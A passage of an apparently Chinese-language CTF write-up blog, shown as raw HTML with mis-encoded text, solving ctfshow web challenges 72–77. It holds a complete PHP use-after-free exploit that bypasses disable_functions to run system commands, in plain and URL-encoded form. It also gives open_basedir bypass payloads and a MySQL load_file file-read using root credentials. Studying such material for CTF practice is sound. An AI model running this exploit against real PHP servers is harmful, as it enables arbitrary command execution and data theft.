class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$zif_system</span> = <span class="hljs-title function_ invoke__">get_system</span>(<span class="hljs-variable">$basic_funcs</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-variable">$fake_obj_offset</span> = <span class="hljs-number">0xd0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x110</span>; <span class="hljs-variable">$i</span> += <span class="hljs-number">8</span>) &#123;<br>        <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-variable">$fake_obj_offset</span> + <span class="hljs-variable">$i</span>, <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_obj</span>, <span class="hljs-variable">$i</span>));<br>    &#125;<br><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_obj_offset</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x38</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>); <br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x68</span>, <span class="hljs-variable">$zif_system</span>); <br><br>    (<span class="hljs-variable">$helper</span>-&gt;b)(<span class="hljs-variable">$cmd</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-title function_ invoke__">ctfshow</span>(<span class="hljs-string">&quot;cat /flag0.txt&quot;</span>);<span class="hljs-title function_ invoke__">ob_end_flush</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>éœ€è¦ URL ç¼–ç å‘åŒ…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">c=%0Afunction%20ctfshow(%24cmd)%20%7B%0A%20%20%20%20global%20%24abc%2C%20%24helper%2C%20%24backtrace%3B%0A%0A%20%20%20%20class%20Vuln%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%3B%0A%20%20%20%20%20%20%20%20public%20function%20__destruct()%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20global%20%24backtrace%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20unset(%24this-%3Ea)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20(new%20Exception)-%3EgetTrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(!isset(%24backtrace%5B1%5D%5B&#x27;args&#x27;%5D))%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20debug_backtrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20class%20Helper%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%2C%20%24b%2C%20%24c%2C%20%24d%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20str2ptr(%26%24str%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24address%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24j%20%3D%20%24s-1%3B%20%24j%20%3E%3D%200%3B%20%24j--)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%3C%3C%3D%208%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%7C%3D%20ord(%24str%5B%24p%2B%24j%5D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24address%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20ptr2str(%24ptr%2C%20%24m%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24out%20%3D%20%22%22%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%3D0%3B%20%24i%20%3C%20%24m%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24out%20.%3D%20sprintf(%22%25c%22%2C(%24ptr%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24ptr%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24out%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20write(%26%24str%2C%20%24p%2C%20%24v%2C%20%24n%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24i%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24str%5B%24p%20%2B%20%24i%5D%20%3D%20sprintf(%22%25c%22%2C(%24v%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24v%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20leak(%24addr%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20global%20%24abc%2C%20%24helper%3B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%200x68%2C%20%24addr%20%2B%20%24p%20-%200x10)%3B%0A%20%20%20%20%20%20%20%20%24leak%20%3D%20strlen(%24helper-%3Ea)%3B%0A%20%20%20%20%20%20%20%20if(%24s%20!%3D%208)%20%7B%20%24leak%20%25%3D%202%20%3C%3C%20(%24s%20*%208)%20-%201%3B%20%7D%0A%20%20%20%20%20%20%20%20return%20%24leak%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20parse_elf(%24base)%20%7B%0A%20%20%20%20%20%20%20%20%24e_type%20%3D%20leak(%24base%2C%200x10%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20%24e_phoff%20%3D%20leak(%24base%2C%200x20)%3B%0A%20%20%20%20%20%20%20%20%24e_phentsize%20%3D%20leak(%24base%2C%200x36%2C%202)%3B%0A%20%20%20%20%20%20%20%20%24e_phnum%20%3D%20leak(%24base%2C%200x38%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24e_phnum%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24header%20%3D%20%24base%20%2B%20%24e_phoff%20%2B%20%24i%20*%20%24e_phentsize%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_type%20%20%3D%20leak(%24header%2C%200%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_flags%20%3D%20leak(%24header%2C%204%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_vaddr%20%3D%20leak(%24header%2C%200x10)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_memsz%20%3D%20leak(%24header%2C%200x28)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%206)%20%7B%20%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_addr%20%3D%20%24e_type%20%3D%3D%202%20%3F%20%24p_vaddr%20%3A%20%24base%20%2B%20%24p_vaddr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%205)%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24text_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20if(!%24data_addr%20%7C%7C%20!%24text_size%20%7C%7C%20!%24data_size)%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%0A%20%20%20%20%20%20%20%20return%20%5B%24data_addr%2C%20%24text_size%2C%20%24data_size%5D%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_basic_funcs(%24base%2C%20%24elf)%20%7B%0A%20%20%20%20%20%20%20%20list(%24data_addr%2C%20%24text_size%2C%20%24data_size)%20%3D%20%24elf%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24data_size%20%2F%208%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20%24i%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x746e6174736e6f63)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20(%24i%20%2B%204)%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x786568326e6962)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20%24data_addr%20%2B%20%24i%20*%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_binary_base(%24binary_leak)%20%7B%0A%20%20%20%20%20%20%20%20%24base%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%24start%20%3D%20%24binary_leak%20%26%200xfffffffffffff000%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x1000%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%3D%20%24start%20-%200x1000%20*%20%24i%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24addr%2C%200%2C%207)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20%3D%3D%200x10102464c457f)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24addr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_system(%24basic_funcs)%20%7B%0A%20%20%20%20%20%20%20%20%24addr%20%3D%20%24basic_funcs%3B%0A%20%20%20%20%20%20%20%20do%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_entry%20%3D%20leak(%24addr)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_name%20%3D%20leak(%24f_entry%2C%200%2C%206)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24f_name%20%3D%3D%200x6d6574737973)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20leak(%24addr%20%2B%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%2B%3D%200x20%3B%0A%20%20%20%20%20%20%20%20%7D%20while(%24f_entry%20!%3D%200)%3B%0A%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20trigger_uaf(%24arg)%20%7B%0A%0A%20%20%20%20%20%20%20%20%24arg%20%3D%20str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;)%3B%0A%20%20%20%20%20%20%20%20%24vuln%20%3D%20new%20Vuln()%3B%0A%20%20%20%20%20%20%20%20%24vuln-%3Ea%20%3D%20%24arg%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(stristr(PHP_OS%2C%20&#x27;WIN&#x27;))%20%7B%0A%20%20%20%20%20%20%20%20die(&#x27;This%20PoC%20is%20for%20*nix%20systems%20only.&#x27;)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24n_alloc%20%3D%2010%3B%20%0A%20%20%20%20%24contiguous%20%3D%20%5B%5D%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n_alloc%3B%20%24i%2B%2B)%0A%20%20%20%20%20%20%20%20%24contiguous%5B%5D%20%3D%20str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;)%3B%0A%0A%20%20%20%20trigger_uaf(&#x27;x&#x27;)%3B%0A%20%20%20%20%24abc%20%3D%20%24backtrace%5B1%5D%5B&#x27;args&#x27;%5D%5B0%5D%3B%0A%0A%20%20%20%20%24helper%20%3D%20new%20Helper%3B%0A%20%20%20%20%24helper-%3Eb%20%3D%20function%20(%24x)%20%7B%20%7D%3B%0A%0A%20%20%20%20if(strlen(%24abc)%20%3D%3D%2079%20%7C%7C%20strlen(%24abc)%20%3D%3D%200)%20%7B%0A%20%20%20%20%20%20%20%20die(%22UAF%20failed%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24closure_handlers%20%3D%20str2ptr(%24abc%2C%200)%3B%0A%20%20%20%20%24php_heap%20%3D%20str2ptr(%24abc%2C%200x58)%3B%0A%20%20%20%20%24abc_addr%20%3D%20%24php_heap%20-%200xc8%3B%0A%0A%20%20%20%20write(%24abc%2C%200x60%2C%202)%3B%0A%20%20%20%20write(%24abc%2C%200x70%2C%206)%3B%0A%0A%20%20%20%20write(%24abc%2C%200x10%2C%20%24abc_addr%20%2B%200x60)%3B%0A%20%20%20%20write(%24abc%2C%200x18%2C%200xa)%3B%0A%0A%20%20%20%20%24closure_obj%20%3D%20str2ptr(%24abc%2C%200x20)%3B%0A%0A%20%20%20%20%24binary_leak%20%3D%20leak(%24closure_handlers%2C%208)%3B%0A%20%20%20%20if(!(%24base%20%3D%20get_binary_base(%24binary_leak)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20determine%20binary%20base%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24elf%20%3D%20parse_elf(%24base)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20parse%20ELF%20header%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24basic_funcs%20%3D%20get_basic_funcs(%24base%2C%20%24elf)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20get%20basic_functions%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24zif_system%20%3D%20get_system(%24basic_funcs)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20get%20zif_system%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%0A%20%20%20%20%24fake_obj_offset%20%3D%200xd0%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x110%3B%20%24i%20%2B%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%20%24fake_obj_offset%20%2B%20%24i%2C%20leak(%24closure_obj%2C%20%24i))%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20write(%24abc%2C%200x20%2C%20%24abc_addr%20%2B%20%24fake_obj_offset)%3B%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x38%2C%201%2C%204)%3B%20%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x68%2C%20%24zif_system)%3B%20%0A%0A%20%20%20%20(%24helper-%3Eb)(%24cmd)%3B%0A%20%20%20%20exit()%3B%0A%7D%0A%0Actfshow(%22cat%20%2Fflag0.txt%22)%3Bob_end_flush()%3B%0A%3F%3E%0A<br></code></pre></td></tr></table></figure><p><code>uaf</code> æ¼æ´å…¨ç§°ä¸º <code>user after free</code>ï¼ŒåŸç†æ˜¯å½“ä¸€ä¸ªå·²ç»é‡Šæ”¾çš„å†…å­˜å—è¢«é‡æ–°åˆ†é…å¹¶å†æ¬¡ä½¿ç”¨æ—¶ï¼Œæ”»å‡»è€…å¯èƒ½åˆ©ç”¨è¯¥å†…å­˜å—ä¸­çš„æ®‹ç•™æ•°æ®æ¥æ‰§è¡Œä»»æ„ä»£ç ï¼Œå±äºå †çš„çŸ¥è¯†ç‚¹</p><p>deepseek è€å¸ˆè¯¦è§£ï¼š</p><p>è¿™ä¸ªPHPè„šæœ¬åˆ©ç”¨PHPä¸­çš„UAFï¼ˆUse After Freeï¼‰æ¼æ´ï¼Œé€šè¿‡ç²¾å¿ƒæ„é€ çš„å†…å­˜æ“ä½œå’Œé—­åŒ…å¯¹è±¡ç¯¡æ”¹ï¼Œå®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚ä»¥ä¸‹æ˜¯å¯¹ä»£ç çš„è¯¦ç»†åˆ†æï¼š</p><p>æ¼æ´è§¦å‘ä¸åˆ©ç”¨æµç¨‹</p><ol><li>UAF è§¦å‘ä¸å†…å­˜æ³„æ¼<ul><li><strong>Vuln ç±»ææ„</strong>ï¼š<code>trigger_uaf</code> å‡½æ•°åˆ›å»º <code>Vuln</code> å¯¹è±¡ï¼Œå…¶ææ„å‡½æ•°é€šè¿‡ <code>debug_backtrace</code> æ•è·å †æ ˆä¿¡æ¯ï¼Œå°†é‡Šæ”¾åçš„å­—ç¬¦ä¸²å¼•ç”¨å­˜å…¥ <code>$abc</code>ã€‚</li><li><strong>å †å¸ƒå±€</strong>ï¼šé¢„å…ˆåˆ†é…å¤šä¸ªé•¿å­—ç¬¦ä¸²ï¼ˆ<code>$contiguous</code>ï¼‰æ¥ç¨³å®šå †å¸ƒå±€ï¼Œç¡®ä¿ <code>$abc</code> æŒ‡å‘é‡Šæ”¾åçš„å†…å­˜åŒºåŸŸã€‚</li></ul></li><li>å†…å­˜æ“ä½œåŸºç¡€å‡½æ•°<ul><li><strong>åœ°å€è½¬æ¢</strong>ï¼š<code>str2ptr</code> å’Œ <code>ptr2str</code> ç”¨äºå­—ç¬¦ä¸²ä¸æŒ‡é’ˆçš„è½¬æ¢ï¼Œ<code>write</code> å‡½æ•°å…è®¸åœ¨å­—ç¬¦ä¸²ä¸­ä»»æ„ä½ç½®å†™å…¥æ•°æ®ã€‚</li><li><strong>å†…å­˜æ³„æ¼</strong>ï¼š<code>leak </code>å‡½æ•°é€šè¿‡ä¿®æ”¹å­—ç¬¦ä¸²å†…éƒ¨æŒ‡é’ˆï¼Œè¯»å–ä»»æ„åœ°å€å†…å­˜å€¼ã€‚</li></ul></li><li>ELF è§£æä¸åŸºå€å®šä½<ul><li><strong>ELF å¤´è¯†åˆ«</strong>ï¼š<code>get_binary_base</code> é€šè¿‡ç‰¹å¾å€¼ <code>0x7f454c460101</code>ï¼ˆELFé­”æ•°ï¼‰å®šä½ PHP äºŒè¿›åˆ¶åŸºå€ã€‚</li><li><strong>ç¨‹åºå¤´è§£æ</strong>ï¼š<code>parse_elf</code> åˆ†æ ELF ç»“æ„ï¼Œè·å–æ•°æ®æ®µå’Œä»£ç æ®µä¿¡æ¯ï¼Œä¸ºåç»­ç¬¦å·æŸ¥æ‰¾å¥ å®šåŸºç¡€ã€‚</li></ul></li><li>å…³é”®å‡½æ•°å®šä½<ul><li><strong>åŸºç¡€å‡½æ•°è¡¨</strong>ï¼š<code>get_basic_funcs</code> éå†å†…å­˜ï¼ŒåŒ¹é… <code>zend_function_entry</code> ç»“æ„ï¼Œå®šä½ PHP å†…éƒ¨å‡½æ•°è¡¨ã€‚</li><li><strong>system å‡½æ•°å®šä½</strong>ï¼š<code>get_system</code> éå†å‡½æ•°è¡¨ï¼Œé€šè¿‡åç§°å“ˆå¸Œï¼ˆâ€™systemâ€™å¯¹åº”<code>0x6d6574737973</code>ï¼‰æ‰¾åˆ° <code>system</code> å‡½æ•°åœ°å€ã€‚</li></ul></li><li>é—­åŒ…å¯¹è±¡ç¯¡æ”¹<ul><li><strong>ç»“æ„å¤åˆ¶</strong>ï¼šå°†åŸé—­åŒ…å¯¹è±¡æ•°æ®å¤åˆ¶åˆ°ä¼ªé€ å¯¹è±¡ä¸­ï¼Œç»´æŒç»“æ„åˆæ³•æ€§ã€‚</li><li><strong>å‡½æ•°æŒ‡é’ˆåŠ«æŒ</strong>ï¼šä¿®æ”¹é—­åŒ…å¤„ç†å‡½æ•°ä¸º <code>system</code>ï¼Œä½¿å¾—è°ƒç”¨é—­åŒ…æ—¶æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</li></ul></li><li>å‘½ä»¤æ‰§è¡Œ<ul><li><strong>æœ€ç»ˆè§¦å‘</strong>ï¼šé€šè¿‡ <code>($helper-&gt;b)($cmd)</code> è°ƒç”¨è¢«ç¯¡æ”¹çš„é—­åŒ…ï¼Œè§¦å‘ <code>system($cmd)</code> æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</li></ul></li></ol><p>å…³é”®ä»£ç è§£æ</p><ul><li><p><strong>UAFåˆ©ç”¨ç‚¹</strong>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$vuln</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vuln</span>();<br><span class="hljs-variable">$vuln</span>-&gt;a = <span class="hljs-variable">$arg</span>; <span class="hljs-comment">// åˆ†é…å­—ç¬¦ä¸²</span><br><span class="hljs-comment">// å¯¹è±¡é”€æ¯åï¼Œ$abcä»å¼•ç”¨å·²é‡Šæ”¾å†…å­˜</span><br></code></pre></td></tr></table></figure></li><li><p><strong>é—­åŒ…å¯¹è±¡åŠ«æŒ</strong>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x68</span>, <span class="hljs-variable">$zif_system</span>); <span class="hljs-comment">// æ›¿æ¢å¤„ç†å‡½æ•°ä¸ºsystem</span><br></code></pre></td></tr></table></figure></li><li><p><strong>å†…å­˜æ³„æ¼ä¸è®¡ç®—</strong>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$closure_handlers</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// è·å–é—­åŒ…å¤„ç†ç¨‹åºåœ°å€</span><br><span class="hljs-variable">$binary_leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_handlers</span>, <span class="hljs-number">8</span>); <span class="hljs-comment">// æ³„æ¼äºŒè¿›åˆ¶åœ°å€</span><br></code></pre></td></tr></table></figure></li></ul><p>è¿™ä¸ªé¢˜å¯¹æˆ‘æ¥è¯´æœ‰ç‚¹éš¾ç†è§£â€¦</p><h1 id="Web-73"><a href="#Web-73" class="headerlink" title="Web 73"></a>Web 73</h1><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-built_in">Warning</span>: error_reporting() has been disabled <span class="hljs-keyword">for</span> <span class="hljs-keyword">security</span> reasons <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">14</span><br><br><span class="hljs-built_in">Warning</span>: ini_set() has been disabled <span class="hljs-keyword">for</span> <span class="hljs-keyword">security</span> reasons <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">15</span><br><br><span class="hljs-built_in">Warning</span>: highlight_file() has been disabled <span class="hljs-keyword">for</span> <span class="hljs-keyword">security</span> reasons <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">24</span><br>ä½ è¦ä¸Šå¤©å—ï¼Ÿ<br></code></pre></td></tr></table></figure><p>å¯ä»¥ç›´æ¥åŒ…å«</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs url">c=var_export(scandir(&#x27;glob:///*&#x27;));die();<br>c=include(&#x27;/flagc.txt&#x27;);die();<br></code></pre></td></tr></table></figure><h1 id="Web-74"><a href="#Web-74" class="headerlink" title="Web 74"></a>Web 74</h1><p>ç”¨ä¹‹å‰çš„ payload å‘ç° <code>scandir()</code> è¢« ban äº†</p><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vhdl"><span class="hljs-literal">Warning</span>: scandir() has been disabled <span class="hljs-keyword">for</span> security reasons <span class="hljs-keyword">in</span> /var/www/html/index.php(<span class="hljs-number">19</span>) : eval()<span class="hljs-symbol">&#x27;d</span> code <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">1</span><br><span class="hljs-keyword">NULL</span><br></code></pre></td></tr></table></figure><p>æ¢æˆ <code>DirectoryIterator</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs url">c=$a = new DirectoryIterator(&quot;glob:///*&quot;);<br>foreach($a as $f)&#123;<br>    echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);<br>&#125;;exit();<br></code></pre></td></tr></table></figure><p>ç»•è¿‡å§¿åŠ¿è¿˜æ˜¯åœ¨è¿™ç¯‡æ–‡ç« æœ‰è®²è§£ <a href="https://www.v0n.top/2020/07/10/open_basedir%e7%bb%95%e8%bf%87/">open_basedirç»•è¿‡</a></p><p>ç„¶å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">c=include(&#x27;/flagx.txt&#x27;);die();<br></code></pre></td></tr></table></figure><h1 id="Web-75"><a href="#Web-75" class="headerlink" title="Web 75"></a>Web 75</h1><p>åŒæ ·ç”¨ payload èƒ½è¯»åˆ°æœ‰ <code>flag36.txt</code>ï¼Œä½†æ˜¯è®¿é—®å¤±è´¥æœ‰é™åˆ¶ï¼Œæœ‰ mysqlï¼Œåˆ©ç”¨ mysql ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<br><span class="hljs-variable">$dbh</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&#x27;mysql:host=127.0.0.1;dbname=mysql&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>);<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$dbh</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&#x27;select load_file(&quot;/flag36.txt&quot;);&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$row</span>)&#123;<br><span class="hljs-title function_ invoke__">var_export</span>(<span class="hljs-variable">$row</span>);<br>&#125;<br><span class="hljs-keyword">die</span>();<br></code></pre></td></tr></table></figure><h1 id="Web-76"><a href="#Web-76" class="headerlink" title="Web 76"></a>Web 76</h1><p>å’Œ Web 75 ä¸€æ ·çš„æ–¹æ³•</p><h1 id="Web-77"><a href="#Web-77" class="headerlink" title="Web 77"></a>Web 77</h1><p>åˆ—å‡ºæ–‡ä»¶è¿˜æ˜¯èƒ½ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 